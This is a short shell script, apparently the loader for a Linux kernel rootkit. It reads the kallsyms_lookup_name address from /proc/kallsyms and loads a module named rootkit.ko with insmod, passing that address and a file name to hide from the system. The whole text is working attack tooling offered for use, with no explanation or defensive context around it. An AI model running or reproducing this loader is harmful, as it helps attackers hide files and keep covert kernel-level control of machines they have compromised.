kallsyms_lookup_addr="$(grep kallsyms_lookup_name /proc/kallsyms | tail -1 | awk '{print $1}')"
insmod rootkit.ko kallsyms_lookup_addr=0x$kallsyms_lookup_addr file_to_hide=$1
